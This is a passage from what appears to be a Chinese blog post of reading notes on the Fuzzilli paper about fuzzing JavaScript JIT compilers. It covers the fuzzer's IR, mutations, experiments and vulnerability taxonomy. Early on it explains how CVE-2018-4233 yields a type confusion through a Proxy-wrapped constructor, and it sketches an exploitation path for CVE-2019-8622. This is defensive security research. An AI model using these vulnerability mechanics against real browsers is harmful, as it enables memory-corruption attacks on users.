JIT代码部署保护措施，以确保在编译期间做出的所有类型假设在运行时确实成立。遗漏任何违反的假设都可能产生严重的后果，从崩溃到可利用的漏洞。但是，根据代码的不同，保护措施可能是冗余的。JIT编译器可以删除冗余检查以进一步优化代码。为了确保保护措施可能是冗余的。JIT编译器会分析保护措施之间的代码是否存在潜在的副作用。这种分析可能是有缺陷的，正如<code>CVE-2018-4233</code>的情况一样。对被认为是无副作用的函数的调用可能会导致调用用户定义的JavaScript回调，而这反过来可能会更改变量的类型。</p></li><li><p><strong>具体的漏洞：</strong> 编译器假定<code>CreateThis</code>操作（负责在构造函数中创建一个新对象）不会导致任何副作用。但是，通过将构造函数包装在Proxy中，此假设被违反。通过能够更改参数对象的类型（在本例中，从浮点数数组更改为JavaScript值数组），可以在发出的机器代码中实现类型混淆。</p><p><strong>图3</strong>显示了一个触发此行为的概念验证。JIT编译器假定构造函数始终接收一个以双精度浮点数作为第一个参数的数组。它在发出的机器代码的开头使用类型检查来保护此假设。但是，CreateThis操作是在对参数对象进行类型检查之后执行的，并且当检索构造函数的<code>prototype</code>属性时，通过<code>Proxy</code>回调调用JavaScript。在回调中更改参数数组的参数类型，然后在构造函数恢复并访问数组时会导致类型混淆。</p><img src="/2025/03/05/Fuzzilli：论文阅读/image-20250305232316947.png"  alt="image-20250305232316947" style="zoom:80%;" /></li></ol><p>由于执行了概念验证代码，因此存储为<code>0x414141414141</code>的双精度浮点值<code>3.54484805889626e-310</code>被错误地用作指针，由于在取消引用地址时发生访问冲突，导致一个攻击者可控制的崩溃。</p><h3 id="4-方法"><a href="#4-方法" class="headerlink" title="4. 方法"></a>4. 方法</h3><p>JIT编译漏洞的模糊测试是一个尚未详细探索的领域，并且需要特别考虑语义正确性。在本节中，我们将介绍我们填补当前JIT编译器fuzzing漏洞空白的方法。我们首先定义一组我们认为成功fuzzing JIT编译器引擎所必须的要求，然后展示基于自定义IR突变的fuzzer如何满足这些要求。</p><h4 id="A-要求"><a href="#A-要求" class="headerlink" title="A. 要求"></a>A. 要求</h4><ol><li><p><strong>语法正确性：</strong> 与代码库的其余部分相比，JavaScript引擎的解析器简单易懂，我们对此不感兴趣。此外，解析器不影响JIT编译器。因此，我们的fuzzing方法需要针对解析器后面的组件。以这些组件为目标需要发出的程序的语法正确性。由于解析阶段拒绝语法无效的示例，因此我们确保程序语法正确。</p></li><li><p><strong>引导式模糊测试：</strong> JIT编译器深深嵌入在JavaScript引擎中。与代码接触的引擎的第一个元素是解析器，然后是解释器，只有在以正确的模式执行代码时，才会触发JIT编译器。为了深入到引擎中，我们需要反馈来生成越来越复杂的输入，强调不同的特性，最终达到JIT编译器。</p></li><li><p><strong>语义正确性：</strong> 如第3节所示，只有在重复且可靠地执行代码的情况下才会触发JIT编译器优化。为了使此类执行发生，我们需要发送代码的语义正确性。发生异常会阻止后续代码的执行，并完全阻止JIT编译，因为引擎没有足够频繁地执行代码。通常，fuzzer通过使用try-catch块包装每个生成的语句来解决此问题。此方法确实可以确保在执行遇到异常后执行后续代码。遗憾的是，这会大大改变程序的语义，因为引入了额外的控制流。因此，JIT编译器以不同的方式处理生成的示例，而不是插入任何try-catch语句。实际上，当控制流图碎片化时（就像插入的try-catch块一样），JIT编译器无法执行许多优化。我们通过将try-catch构造添加到在fuzzing期间找到的程序中来证实了这一假设，之后在大多数情况下停止触发bugs。因此，很明显，成功fuzzing JIT编译器的核心要求是能够以很高的可能性生成语义上正确的代码。</p></li><li><p><strong>语义代码突变：</strong> 我们确定我们想使用反馈方法，并且需要语义正确性才能获得成功的fuzzing框架。仍然缺少一个基本组件：代码的基础语义。JIT编译器只处理代码的语义属性，例如控制流和数据流。这是因为JIT编译器通常在其自己的字节码IR上运行，而对初始AST和语法没有任何了解。因此，希望在该级别执行突变并结合引导式fuzzing提供的反馈。使用反馈的最简单方法是使用基于突变的fuzzing。通过此过程，fuzzer可以动态地将样本添加到语料库中，从而产生新的覆盖范围，并在将来进一步对其进行突变。现有的基于突变的解释器fuzzer（例如LangFuzz）使用AST等表示形式来突变代码的语法元素。但是，句法元素与我们的方法所针对的组件（即JIT编译器）无关。此外，AST可能是模棱两可的。因此，仅语义突变更难实现，因为立即突变可能只会导致程序的句法更改，而不是语义更改。</p><p><strong>图4</strong>显示了一个示例，其中具有不同AST的两个代码片段表达了相同的计算。基于AST的突变可能只是这两个代码片段之间的转换。为了解决这个问题，我们选择使用一个接近编译器使用的表示的中间表示。在这种IR上进行的突变避免了语义上无意义的突变，并提高了fuzzing的有效性。通过在IR上执行一组不同的突变我们可以更快地检测到不同的缺陷。我们注意到，可以限制AST突变以对抗无意义的突变，但实际上它会变成自己的IR。</p><img src="/2025/03/05/Fuzzilli：论文阅读/image-20250306002445823.png"  alt="image-20250306002445823" style="zoom:80%;" /></li></ol><h4 id="B-专为Fuzzing设计的中间表示（IR）"><a href="#B-专为Fuzzing设计的中间表示（IR）" class="headerlink" title="B. 专为Fuzzing设计的中间表示（IR）"></a>B. 专为Fuzzing设计的中间表示（IR）</h4><p>正如上一节所解释的，我们的模糊测试方法使用自己的IR。因此，我们将fuzzer的设计集中在自定义中间表示IR中对代码进行突变，然后将IR代码转换为JavaScript以供执行的想法上。我们根据第4节A中陈述的要求设计了我们的IR：</p><p><strong>IR设计：</strong> 在我们的IR中，程序由指令列表组成，每个指令又由操作以及输入和输出变量列表组成。<strong>图5</strong>显示了一个示例程序，该程序计算从零到九的数字之和。请注意，IR操作可以是参数化的。参数包括操作中的常量、属性和方法名称、二元和一元操作的运算符以及比较。我们使用特殊的块指令实现了控制流，至少存在一个起始块和结束块。我们的IR使用静态单赋值（SSA）形式，这意味着任何变量都只有一个赋值。SSA形式有助于实现我们稍后使用的定义-使用分析。它还提高了类型推断的可靠性并简化了代码生成，例如，输出值将始终分配给新的SSA变量。可以通过Phi操作重新分配JavaScript变量，该操作产生一个可以通过Copy指令重新分配的输出。我们在附录C中给出了已实现的IR操作的完整列表，以及它们涵盖的JavaScript语言特性的描述。</p><img src="/2025/03/05/Fuzzilli：论文阅读/image-20250307103514503.png"  alt="image-20250307103514503" style="zoom:67%;" /><p><strong>所需不变式：</strong> 此外，我们要求以下五个不变式对于我们的IR中的每个程序都必须独立，因此对于从中生成的JavaScript程序也必须成立：</p><ul><li><strong>所有输入都是变量</strong>： 指令的所有输入值都必须是变量。没有立即数或嵌套表达式。这使得能够更直接地推理程序的数据流并方便对其进行突变。</li><li><strong>变量在使用前定义</strong>： 为了减少可能的语义错误，所有变量在使用之前都必须定义，无论是在当前块还是封闭块中。</li><li><strong>没有开放的语义块</strong>： 块的开头必须最终跟随相应的关闭指令或中间块指令，例如BeginElse，这也同样适用。这是保证语法正确性所必需的。</li><li><strong>在外部定义的块的输入</strong>： 块指令的所有输入都必须在外部块中定义，反映了JavaScript的变量定义规则。</li><li><strong>Phi的使用</strong>： 为了保留SSA语义，Copy指令的第一个输入必须是Phi指令的输出。</li></ul><p><strong>将IR提升到JavaScript：</strong> 我们首先通过单独翻译每个指令，将程序从我们的IR提升到JavaScript。作为下一步，我们尽可能内联表达式以创建更易于阅读的代码。</p><h4 id="C-变异IR"><a href="#C-变异IR" class="headerlink" title="C. 变异IR"></a>C. 变异IR</h4><p>我们设计的突变方式是，它们可以修改以我们的IR表示的程序的核心方面。特别是，我们通过突变实现了以下四个目标：</p><ul><li>指令之间的数据流的突变（输入突变、生成突变）</li><li>指令执行的计算的突变（操作突变）</li><li>程序的控制流的突变（组合突变、生成突变）</li><li>来自两个不同程序的方面的组合（组合突变）</li></ul><p>下面，我们将描述如何通过不同类型的突变来实现这些目标。</p><ol><li><strong>输入突变</strong>：输入突变是对程序的数据流的简单突变。我们将指令的一个SSA输入替换为另一个输入。这会导致指令在运行时对另一个值进行操作，从而可能产生不同的结果。</li><li><strong>操作突变</strong>：操作突变包括选择一个随机参数化指令并更改其参数之一。例如，我们更改常量值，使得程序使用不同的方法或属性，或者替换二元或一元运算。</li><li><strong>组合突变</strong>： 组合突变将不同程序的部分组合成一个新程序：在突变的简单版本中，我们将一个完整的程序插入到第二个程序中的随机位置。这需要重命名插入程序中的变量以避免变量名称冲突，但这很容易实现。突变的更复杂版本仅将现有程序的一部分插入到第二个程序中。突变选择一个随机指令，并递归地选择所有输出也用作输入的指令。然后，我们将结果切片复制到另一个程序中。<strong>图5</strong>显示了程序的示例切片。然后，可以将此切片简单地复制到不同的程序中，因为它本身是独立的。但是，此突变不会更改任何现有数据流，因为两个输入程序的SSA变量未混合。为了合并两个输入程序的数据流，之后需要进行输入突变。</li><li><strong>生成突变</strong>：生成突变只是简单地将新生成的代码（这些代码使用现有值）在随机位置插入到现有程序中。为此，我们实现了几个代码生成器函数，这些函数发出简短的代码片段。总的来说，我们为IR的每个语言特性实现了一个简单的代码生成器，以及少量的特殊代码生成器，用于触发JIT编译或强调历史上容易出错的特性。</li></ol><h4 id="D-实现高概率的语义正确性"><a href="#D-实现高概率的语义正确性" class="headerlink" title="D. 实现高概率的语义正确性"></a>D. 实现高概率的语义正确性</h4><p>我们对IR施加的不变式——每个突变都保留了这些不变式——避免了一些简单的语义错误，例如在使用变量之前定义变量。这些限制本身不足以确保生成的语料库的语义正确性。我们添加了三个额外的措施来提高语义正确性：</p><ol><li><p><strong>仅允许有效的语料库</strong>：我们通过确保仅将语义上有效的样本添加到运行时语料库中，来实现额外的语义正确性。为了实现这一点，不仅需要在每次执行期间记录覆盖率信息，还需要记录程序是否由于未捕获的运行时异常而异常终止。在所有受支持的引擎中，这可以通过退出代码来实现，如果未引发未捕获的异常，则退出代码通常为0，否则为非0。</p></li><li><p><strong>仅执行小的更改</strong>：进一步提高语义正确性概率的一个关键见解是，每次突变只有很小的概率会将有效的（在语义上）程序变为无效程序。这是因为每次突变要么本质上是语义正确的（组合突变），要么仅以较小的方式影响程序（输入突变、操作突变、生成突变）。</p></li><li><p><strong>轻量级类型系统</strong>：我们提高生成组件语义正确性的最后一步是自定义类型系统，因为类型错误是语义错误的重要来源。 为此，我们实现了一个轻量级的抽象类型推断引擎。 推断引擎可以静态地近似 SSA 变量的运行时类型。 然后，此信息用于避免生成明显无效的代码结构，例如对非对象的方法调用或对不可调用对象的功能调用。 为了不限制模糊器可以生成的代码的多样性，其他突变通常会忽略类型信息。</p><p>我们将类型系统设计得尽可能简单，但功能足够强大，可以推断出可以在运行时对值执行的可能操作。支持的基本类型为<code>Tinteger、Tfloat、Tstring、Tboolean、Tfunction(signature)、Tconstructors(signature)、Tobject([properties],[methods])、Tundefined、Tunknown</code>。</p><p>这些类型可以使用联合运算符<code>t1 | t2</code>组合，表示一个值是多个类型之一。例如，JavaScript中加法运算符的结果通常是数字或字符串，因此将表示为<code>Tinteger | Tfloat | Tstring</code>。</p><p>此外，还可以使用<code>t1 + t2</code>组合两种类型。这种合并类型表示一个值同时是两种或多种类型。这种类型的一个例子是<code>JavaScript</code>中的字符串，因为它们向用户公开属性和方法。因此，类型系统将它们表示为<code>Tstring + Tobject</code>。</p><p>最后，类型系统还可以对对象的属性和方法列表以及函数和构造函数的签名进行建模。</p><p>抽象类型推断引擎具有简单的规则，可以确定每个操作的输出类型，并且在运行时环境的静态模型上运行，该模型包含每个内置对象的类型信息。每当两个或多个代替控制流路径合并时，我们使用联合运算符组合变量状态。</p><p>JavaScript和我们的推断引擎之间的执行语义略有不同，例如，推断引擎没有原型（就像JavaScript中存在的那样）的概念。虽然简化了实现，但这会导致静态类型的近似中出现错误。但是，在实践中，这些问题被证明是没有问题的，因为代码生成器保守地使用类型近似。</p><p>由于静态类型推断系统仅仅是一种性能优化，因此可以完全禁用它，在这种情况下，所有变量的类型将变为Tunknown，并且代码生成器将生成真正的随机操作。在实践中，我们发现正确率在50%到75%之间变化。</p><h4 id="E-IR的模糊测试"><a href="#E-IR的模糊测试" class="headerlink" title="E. IR的模糊测试"></a>E. IR的模糊测试</h4><p>我们的模糊测试方法通常遵循基于突变的模糊器的标准进行设计。在每次迭代中，模糊器从现有语料库（以单行JavaScript程序为种子）中选择程序<code>P</code>，并随机对其进行突变以生成新程序<code>Pm</code>。然后，模糊器将<code>Pm</code>提升为JavaScript代码，该代码随后在目标引擎上执行，同时收集覆盖率统计信息，例如，通过<code>Clang</code>的<code>sanitizercoverage</code>功能。如果<code>Pm</code>的执行增加了目标程序的覆盖率，则<code>Pm</code>被认为是<code>interesting</code>并保留以供将来进行突变。</p><p>但是，由于我们的突变只能增加程序的大小而不能缩小程序的大小，因此必须在将<code>Pm</code>添加到语料库之前对其进行最小化。否则，语料库中程序的大小补将不断增加并减慢模糊测试的速度。通过定点迭代可以简单地进行最小化，该迭代连续删除指令，同时确保结果程序仍然显示相同的覆盖率增加。</p><p>由于两个<code>interesting</code>的程序之间的距离通常大于单个突变可以桥接的举例，因此我们连续多次突变一个程序。但是，为了防止不必要的资源投入，如果最后一次突变产生了无效程序，则会还原最后一次突变。<code>Algorithm 1</code>中给出了高级模糊测试算法的伪代码。</p><img src="/2025/03/05/Fuzzilli：论文阅读/image-20250307115122923.png"  alt="image-20250307115122923" style="zoom: 80%;" /></li></ol><h3 id="5-实验"><a href="#5-实验" class="headerlink" title="5. 实验"></a>5. 实验</h3><p>我们在Swift编程语言中实现了一个名为Fuzzilli的工具，其中包含前一节中概述的fuzzer设计。我们使用此原型实现进行评估，并针对三种最先进的JavaScript引擎的检测JavaScript引擎代码运行它：<code>Google V8</code>、<code>Apple JavaScript</code>和<code>Mozilla SpiderMonkey</code>。</p><h4 id="A-模糊测试的时间"><a href="#A-模糊测试的时间" class="headerlink" title="A. 模糊测试的时间"></a>A. 模糊测试的时间</h4><p>本节报告中的漏洞是连续六个月的模糊测试会话的结果。每个会话持续约一周，并使用约500个CPU核心。对于每个会话，使用当时的最新源代码版本，或者如果可用，则使用当前Beta版本的源代码。我们在Google Compute Engine(GCE)上运行模糊测试，并且主要使用多个N1standard-4机器类型（4个CPU，15GB RAM）。此外，我们选择使用抢占式示例来降低成本。</p><h4 id="B-setup"><a href="#B-setup" class="headerlink" title="B. setup"></a>B. setup</h4><p>我们将目标引擎编译为独立二进制文件，而不包含Web浏览器绑定。此外，我们修改了引擎以支持目标接口，该接口需要在我们fuzzer和JavaScript引擎之间通过一组通信管道进行通信。此外，我们降低了JIT编译阈值以更早地触发JIT编译，从而加快了模糊测试速度。通常，我们将阈值设置为大致100次函数执行会导致对其进行编译。此阈值允许引擎收集类型信息，同时加快了模糊测试速度。修改阈值是先前模糊测试解决方案部署的常用技术。</p><p>最后，我们出于性能原因，在启用了优化的自定义调试配置中编译了引擎。调试配置包含许多内部断言，这些断言在发行版本中出于性能原因被删除。我们启用断言，因为它们有助于检测不会立即体现为内存安全违规的可利用缺陷。例如，<code>CVE-2019-8622</code>是通过断言失败发现的。JIT编译器假定特定操作永远不会导致垃圾回收（GC）发生。但是，在执行期间，降低的操作确实调用了在某些情况下可以触发GC的API。然后可以通过首先在专门选择的时间触发GC，然后故意制作JavaScript代码来利用这种情况，以便随后在JIT编译的代码中访问现在释放的JSObject。这两个步骤都是导致内存安全违规所必需的。由于这两个步骤都需要大量专门制作的代码，因此它们不太可能通过模糊测试直接找到，但此类违规的指标可以通过模糊测试来检测。</p><p>许多发现的漏洞首先体现为失败的断言或空指针解引用。之后，我们对Crash进行了手动分类，以确定它们是否对安全是至关重要且可利用。虽然鉴于失败的断言或崩溃情况，一些观察到的崩溃显然是可利用的，但其他崩溃首先需要进行大量分析才能确定可利用性。所有已识别的错误均以协调方式报告给开发人员。我们认为列出的所有缺陷都是可利用的，并且要么收到了CVE要么收到了Chrome内部问题编号。因此，这些问题随后由开发人员修复。</p><p>1）<strong>类型分类：</strong> Table 1显示了所有17个发现的漏洞的全面摘要，这些漏洞提交后分配给我们一个CVE或内部问题编号。所有已识别的漏洞都与JIT编译相关，并且跨越了诸如无效的边界检查删除、不正确的类型推断和寄存器错误分配问题等问题。</p><p>2）<strong>存在时长确定：</strong> 我们还通过编译旧版本的软件并验证找到测试用例是否触发崩溃来确定漏洞的存在时长。对于JavaScriptCore和V8，我们使用git的bisecting功能来查找最旧的版本。对于Firefox，我们使用旧的官方版本并在这些版本上进行了测试。由于测试用例可能由于无关原因而未在其他版本上触发，甚至可能触发另一个错误，因此Age确定的结果可能包含不准确之处，但通常是保守的。在我们无法如上所述动态确定问题版本的情况下，我们求助于手动源代码分析，以尝试确定何时引入了易受攻击的代码。由于这比编译和测试代码更容易出错，因此此处的结果不太确定。</p><img src="/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20250307152941454.png" class="" title="image-20250307152941454"><h3 id="6-发现漏洞的分类"><a href="#6-发现漏洞的分类" class="headerlink" title="6. 发现漏洞的分类"></a>6. 发现漏洞的分类</h3><p>为了系统化发现的漏洞，我们首先描述导致每个漏洞的根本原因，然后介绍两个分类法。第一个根据影响对漏洞进行分类，第二个根据漏洞发生的时间对漏洞进行分类。Table 1中显示了已分类漏洞的表格概述。</p><h4 id="A-根本原因"><a href="#A-根本原因" class="headerlink" title="A. 根本原因"></a>A. 根本原因</h4><p>我们确定了三个常见的根本原因：移动代码时的优化、运行时执行语义的错误建模和类型检查的错误删除。不符合此分类的根本原因被归类为杂项。</p><ol><li>代码移动：一个常见的优化包括在程序中移动代码片段（例如，循环不变代码移动）。但是，如果这样做不正确，则以前安全的代码片段会变得不安全（3个漏洞）。</li><li>不正确的建模：可能因运行时执行语义的错误建模而出现问题，例如操作是否具有副作用或是否会触发垃圾回收（2个漏洞）。</li><li>不正确的类型推断：JIT编译器的一个核心优化是运行时类型信息的推断，这允许省略类型检查。只要将不兼容的值存储在具有关联类型信息的属性中，就必须更新该类型信息，因为JIT编译器依赖于它来省略运行时类型检查。（4个漏洞）。</li><li>杂项：并非所有发现的漏洞都具有共同的根本问题。这可能是因为它们是”一次性“错误，或者仅仅是因为没有发现可以形成类别的其他类似漏洞（9个漏洞）</li></ol><p>此外，发现的漏洞可以根据其影响和影响时间来区分。接下来，我们简要解释这两个类别。</p><h4 id="B-按影响分类"><a href="#B-按影响分类" class="headerlink" title="B. 按影响分类"></a>B. 按影响分类</h4><p>我们确定了四种常见类型的效果集群（和一个杂项集群），大多数发现的漏洞都可能具备这些效果：</p><ol><li>类型安全违规：所有导致某种类型混淆的漏洞（7个漏洞）</li><li>空间内存安全违规：所有导致空间内存损坏的漏洞，例如对堆分配的内存块的越界访问（2个漏洞）。</li><li>时间内存安全违规：所有导致时间内存安全违规的漏洞，例如，由于使用先前释放的内存（3个漏洞）。</li><li>使用未初始化的数据：所有使用未初始化数据的漏洞，例如从堆栈中未初始化的位置读取指针值（2个漏洞）。</li><li>杂项：所有不属于任何上述类别的漏洞（3个漏洞）。</li></ol><h4 id="C-按影响时间分类"><a href="#C-按影响时间分类" class="headerlink" title="C. 按影响时间分类"></a>C. 按影响时间分类</h4><p>漏洞可能发生的时间有两种，一种是在运行时，另一种是在编译时。</p><ol><li>运行时：此类别中的所有漏洞都是逻辑编译器缺陷，可能会导致内存损坏，从而在运行时发出的机器代码中触发（14个漏洞）。</li><li>编译时：此类别包括“经典”内存损坏错误以及编译器特定的错误，这些错误会导致编译期间发生内存损坏（3个漏洞）。</li></ol><h3 id="7-我们方法的有效性"><a href="#7-我们方法的有效性" class="headerlink" title="7. 我们方法的有效性"></a>7. 我们方法的有效性</h3><p>由于模糊测试的非确定性本质，不同模糊测试方法的目标属性难以比较。进行有意义的比较的另一个障碍是模糊器的不同目标和设计原则。 我们专门为查找 JIT 漏洞而设计了名为 Fuzzilli 的方法，并进行了相应的专业化。 此外，我们的方法不需要输入语料库，可以自行生成新的 JavaScript 代码。其他 JavaScript 模糊器，例如<code>Superion</code>或<code>SoFi</code>，具有更通用的设计目标，并且需要输入语料库。因此，在比较它们时，必须考虑设计的上下文。</p><p>为了评估我们方法的有效性，我们进行了描述性和经验性分析。我们首先通过分析我们方法的目标通用性和质量来开始我们的描述性评估。 然后，我们提出了一个实证研究，其中我们调查了我们不同生成器的影响，测量了我们方法的代码覆盖率，并将其与<code>Superion</code>进行了比较。 为了允许将来的复制，我们使我们的代码和工程可以在线公开获得。</p><h4 id="A-可描述的有效性评估"><a href="#A-可描述的有效性评估" class="headerlink" title="A. 可描述的有效性评估"></a>A. 可描述的有效性评估</h4><p>在我们的实验中，我们发现并报告所有三个主要 JavaScript 引擎中的多个先前未知的漏洞，并被分配了相应的 CVE 或问题编号（参见表 I）。 这些发现表明，我们的方法在适用性方面实现了通用性，即我们没有针对特定引擎或基准进行优化，并且对不同的高度相关的 JavaScript 引擎产生了积极的安全影响。</p><p>此外，所有三个引擎都经过供应商特定的模糊测试基础设施和第三方模糊器的持续测试。 由于这些先前的努力，JavaScript 引擎通常被认为是经过良好测试的软件。 然而，我们发现了 17 个漏洞，这些漏洞逃过了竞争性模糊器的攻击，其中一些漏洞是三年多前引入的。 这表明我们的模糊器是 JavaScript JIT 模糊测试的重大质量改进。</p><h4 id="B-基于经验的有效性评估"><a href="#B-基于经验的有效性评估" class="headerlink" title="B. 基于经验的有效性评估"></a>B. 基于经验的有效性评估</h4><p>我们的经验有效性评估是双重的。 首先，我们分析了不同的生成器中的每一个产生的影响，以及我们在三个主要的 JavaScript 引擎中随着时间的推移能够实现的突变数量。 其次，为了表明我们的模糊器在整个 JavaScript 模糊测试环境中具有竞争力，我们对 Superion进行了经验评估。 这个模糊器代表了 JavaScript 模糊测试的当前最新技术水平，并且作者已经证明它在几个方面优于其他方法。</p><ol><li><p><strong>生成器效果分析：</strong> 我们针对 SpiderMonkey、JavaScriptCore 和 V8 这三个 JavaScript 引擎运行了五次模糊器，持续 24 小时。 在这些运行过程中，我们记录了导致代码覆盖率增加的突变。 <strong>图 6</strong> 显示了 JavaScriptCore 和 SpiderMonkey 的结果，由于页面限制，V8 的图显示在附录 A 中。 我们可以观察到，在生成新样本时，生成和输入突变是最重要的贡献者。 组合和操作突变是接下来的两个有影响力的突变。 有趣的是，在我们的经验分析中，明确强调 JIT 的贡献最小。 这些结果表明，在模糊测试 JIT 漏洞时，无需完全关注与 JIT 相关的突变。 实际上，相对较小但持续的努力就足够了。 不同的突变策略的深入解释可以在第 IV-C 节中找到。</p><p>不同的引擎之间也没有明显的差异。 成功的突变器的分布保持在相同的比例内。 对于每分钟产生新样本的突变数量，JSC 和 SpiderMonkey 都趋于零，这一观察结果也成立。 但是，我们发现 JSC 的初始下降速度比 SpiderMonkey 慢。</p></li></ol><img src="/2025/03/05/Fuzzilli：论文阅读/image-20250308152959894.png"  alt="image-20250308152959894" style="zoom:67%;" /><ol start="2"><li><strong>与SoFi的比较：</strong> 我们本希望包含与最近发布的 SoFi 方法的直接比较。 遗憾的是，作者既没有发布完整的源代码，也没有在联系时提供代码。 我们分析了论文表 2 中报告的结果，发现三个相关的 JavaScript 引擎 SpiderMonkey、JavaScriptCore 和 V8 中发现的“错误”似乎并不代表实际的安全关键漏洞。 例如，为 SpiderMonkey 报告的前四个错误被开发人员标记为无效，根本不代表漏洞。 第五个报告是重复的。 同样，为 JavaScriptCore 报告的“错误”也被开发人员标记为无效。 我们对已报告结果的分析以及源代码的不可用性感到困惑。 遗憾的是，无法通过与作者的直接交流来解决这些问题，因此无法进行直接比较。</li><li><strong>与Superion的比较：</strong> 比较模糊器的一个广泛使用的指标是代码覆盖率，因为它显示了引擎的到达程度以及因此的测试程度。 我们选择利用分支覆盖率作为我们的指标。 由于我们的模糊器专门从事 JIT 模糊测试，我们还比较了 JIT 特定的覆盖率。 如上所述，我们的目标引擎是 JavaScriptCore、V8 和 SpiderMonkey，因为它们用于现代 Web 浏览器中。 每个模糊器 JS 引擎的确切命令行标志显示在附录 B 中。</li></ol><p><strong>配置：</strong> 我们使用 Ubuntu 22.04 在配备 256GB RAM 的 Xeon Gold 5320 CPU 的 100 个内核上运行每个模糊器五次，持续 24 小时。 Fuzzilli 和 Superion 实例部署在虚拟机中，每个 100 个实例分配了 2GB 的 RAM。 对于这两个模糊器，都启用了语料库共享。</p><p><strong>使用语料库：</strong> 我们的模糊器不使用输入语料库，而 Superion 确实需要语料库。 这是尝试进行公平和客观比较时需要注意的一个问题，因为语料库可能会决定模糊测试结果和进度的质量和最终覆盖率。 另一个阻碍是 Superion 没有发布其语料库。 我们选择使用公开可用的 DIE 语料库 2 作为 Superion 的输入。 为了衡量启动语料库对 Superion 成功的影响，我们还在随机选择的 DIE 子语料库上进行了评估。 我们通过连续添加随机样本直到达到 17% 的分支覆盖率来生成这些子语料库，这大约是整个 DIE 语料库产生的一半覆盖率。 每个子语料库都用于单独的评估。 我们承认不使用原始输入语料库可能会导致比先前报告的更糟糕的结果。 然而，模糊器在没有特定主体的情况下也能很好地工作这一事实，是模糊器必须具备的通用性特征。</p><p><strong>评估：</strong> 为了评估代码覆盖率，我们将收集的样本文件分成每分钟模糊测试的集合。 针对相应的 llvm-cov 检测引擎评估每个集合。 我们合并了每个集合随时间推移产生的覆盖率数据，从 Fuzzilli 的按时间顺序排列的第一个集合以及 Superion 的输入语料库的覆盖率开始。 总覆盖率包括整个引擎的覆盖率，由 llvm-cov 报告文件表示为“TOTAL”。 为了获得 JIT 特定的覆盖率，我们提取并平均了每个可能参与 JIT 编译的文件的报告的覆盖率，方法是对各个文件路径使用正则表达式</p><p><strong>结果：</strong> 我们评估了分支覆盖率，并在我们的五次运行中对其进行了平均。 Superion 将 JavaScriptCore、V8 和 SpiderMonkey 的完整 DIE 输入语料库的初始总覆盖率分别提高了 2.15%、0.98% 和 2.47%。 对于 17% 覆盖率的子语料库，Superion 将覆盖率提高了 11.14%、6.13% 和 6.74%。 我们的模糊器达到的最终覆盖率为 43.72%、30.64% 和 30.53%。</p><p>关于 JIT 特定覆盖率，Superion 提高了 0.89%、0.89% 和 1.22%。 对于 17% 覆盖率的子语料库，改进幅度为 14.37%、9.11% 和 8.87%。 我们的模糊器达到的最终覆盖率为 59.22%、53.47% 和 56.27%。</p><p>我们还专门针对 JavaScriptCore 评估了行覆盖率，因为这是我们和 Wang 等人评估的引擎的交集，以及他们报告的指标 43。 使用初始行覆盖率为 52.01% 的完整 DIE 语料库，Superion 提高了 1.44%。 对于部分语料库，Superion 提高了 11.49%。 我们的模糊器达到的行覆盖率为 49.51%。</p><p>对于 JIT 特定覆盖率，Superion 将初始覆盖率为 64.58% 的完整 DIE 语料库提高了 0.53%。 对于初始覆盖率为 44.10% 的部分语料库，Superion 提高了 14.13%。 我们的模糊器达到的 JIT 特定行覆盖率为 65.60%。</p><p>显示随时间推移的分支覆盖率的图在图 7 中给出。 表 II 中可以找到原始分支覆盖率结果的表格概述。 图 8 以可视化方式比较了行覆盖率。</p><p><strong>讨论：</strong> JavaScriptCore 的行覆盖率和分支覆盖率相似，这导致假设这两个指标可以互换。 总体而言，当提供完整的 DIE 语料库时，Superion 的表现优于我们的模糊器。 Superion 的最终覆盖率比我们的最终覆盖率高 3%、6% 和 8%。 然而，除了启动语料库之外实现的覆盖率很小，并且 DIE 语料库本身已经达到了比我们的模糊器的最终覆盖率更高的覆盖率。 因此，更好的覆盖率不能归因于 Superion。</p><p>一个有趣的观察结果是，Wang 等人报告说，Superion 对 WebKit&#x2F;JSC 的行覆盖率从 52.4% 增加到 78.0%，增加了 25.6% 的覆盖率。 然而，使用初始行覆盖率为 52.01% 的 DIE 语料库只会导致最终行覆盖率为 53.45%，仅增加了 1.44%（参考图 8）。 我们的假设是，这是由于输入语料库的差异造成的，并且应该被认为是不同输入语料库可能对最终覆盖率产生的影响的证明。</p><p>当仅向 Superion 提供缩减的语料库时，我们的表现明显优于 Superion。 我们的模糊器对 JavaScriptCore、V8 和 SpiderMonkey 的额外覆盖率分别达到了 15%、7% 和 7%。 与大型语料库相比，Superion 可以再次显着提高覆盖率，这表明初始语料库可以对结果产生影响。 然而，这些改进的益处值得怀疑，因为它们是已经存在的大型 DIE 语料库的子集，该语料库主要由浏览器供应商测试用例组成。 因此，JavaScript 引擎的测试没有总体改进。</p><p>关于 JIT 特定覆盖率，我们在完整 DIE 语料库上对 JSC 的表现优于 Superion 1.6%，并且对 V8 和 SpiderMonkey 的表现分别低了 0.8% 和 3.8%。 但同样，启动语料库本身的初始覆盖率已经高于我们的最终覆盖率，并且 Superion 增加的覆盖率很小。 然而，这表明即使向 Superion 提供全面的启动语料库，我们也能在 JIT 聚焦模糊测试方面优于 Superion 或与 Superion 竞争。 减少的启动语料库导致了与完整覆盖率相似的 JIT 覆盖率结果。</p><h4 id="C-经验教训"><a href="#C-经验教训" class="headerlink" title="C. 经验教训"></a>C. 经验教训</h4><p>在 JIT 覆盖率方面，即使在向 Superion 提供完整的 DIE 语料库的情况下，我们也能与 Superion 竞争，甚至在 JSC 中胜过 Superion。 令人惊讶的是，在查看总体覆盖率时，Superion 几乎没有在完整的 DIE 语料库上进行改进。 关于减少的初始语料库，我们在 JIT 和一般覆盖率方面都严格优于 Superion。</p><p>最后，即使我们也从 52% 的初始行覆盖率开始，我们也无法重现报告的 JSC 行覆盖率提高 25.6%。 这让我们感到困惑，因为这表明 Wang 等人使用的语料库存在可以填补的显著且可达到的覆盖率缺口，但 DIE 语料库中不存在这些缺口。 由于原始的 Superion 语料库尚未发布，因此我们很遗憾无法尝试重现他们的原始结果。</p><p>因此，我们强调未来的模糊测试研究必须提供任何初始语料库以实现重现，并且应该更加强调使用不同的、可能新颖的语料库重现先前的模糊测试结果，以估计模糊器在不同的语料库中的泛化程度。</p><p>关于不同突变策略的影响，我们表明，为了能够专注于 JIT 漏洞，只需付出较小但持续的努力来强调 JIT 即可。</p><h3 id="8-结论"><a href="#8-结论" class="headerlink" title="8. 结论"></a>8. 结论</h3><p>在本文的过程中，我们展示了 JIT 